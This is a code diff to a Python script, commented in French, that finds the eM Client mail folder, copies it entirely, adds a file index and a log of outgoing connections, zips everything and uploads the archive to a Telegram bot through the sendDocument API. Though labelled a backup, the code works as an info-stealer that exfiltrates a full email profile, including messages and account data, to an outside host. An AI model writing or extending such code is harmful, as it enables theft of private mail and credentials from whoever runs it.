@@ -39,8 +39,7 @@ def chercher_dossier_emclient():
     return None
 
 def afficher_info_reseau():
-    print("\n=== Informations Réseau Locale ===\n")
-
+    print("\n=== Informations Réseau Locale ===")
     try:
         hostname = socket.gethostname()
         print(f"Nom de la machine : {hostname}")
@@ -61,10 +60,17 @@ def afficher_info_reseau():
 
     systeme = platform.system()
     if systeme == "Windows":
-        print("\nDétails réseau (ipconfig) :\n")
+        print("\nDétails réseau (ipconfig) :")
         subprocess.run(["ipconfig"], shell=True)
     else:
         subprocess.run(["ifconfig"], shell=False)
+
+def lister_contenu_dossier(dossier, fichier_output):
+    with open(fichier_output, "w", encoding="utf-8") as f:
+        for root, _, files in os.walk(dossier):
+            for file in files:
+                rel_path = os.path.relpath(os.path.join(root, file), dossier)
+                f.write(rel_path + "\n")
 
 def exporter_dossier_complet_et_envoyer():
     try:
@@ -77,11 +83,16 @@ def exporter_dossier_complet_et_envoyer():
         backup_dir = os.path.join(temp_dir, "eMClientBackup")
         shutil.copytree(emclient_path, backup_dir)
 
-        # Ajouter journal IP si actif
+        # Fichier des connexions sortantes
         ip_logs = detect_outgoing_connections()
         with open(os.path.join(backup_dir, "fuite_ip.txt"), "w") as f:
             f.write("\n".join(ip_logs) if ip_logs else "Aucune connexion sortante détectée.")
 
+        # Fichier index.txt listant tous les fichiers copiés
+        index_path = os.path.join(backup_dir, "index.txt")
+        lister_contenu_dossier(backup_dir, index_path)
+
+        # Création du ZIP
         zip_path = os.path.join(temp_dir, NOM_ZIP)
         with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
             for root, _, files in os.walk(backup_dir):
@@ -90,14 +101,15 @@ def exporter_dossier_complet_et_envoyer():
                     rel_path = os.path.relpath(abs_path, backup_dir)
                     zipf.write(abs_path, rel_path)
 
+        # Envoi sur Telegram
         with open(zip_path, "rb") as f:
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
-                data={"chat_id": CHAT_ID, "caption": f"📦 Backup complet eM Client - {datetime.datetime.now().strftime('%d/%m/%Y')}"},
+                data={"chat_id": CHAT_ID, "caption": f"📦 Backup eM Client - {datetime.datetime.now().strftime('%d/%m/%Y')}"},
                 files={"document": f}
             )
 
-        print("✅ Backup complet envoyé.")
+        print("✅ Backup complet envoyé avec index.txt et fuite_ip.txt.")
     except Exception as e:
         print("Erreur :", e)
     finally:
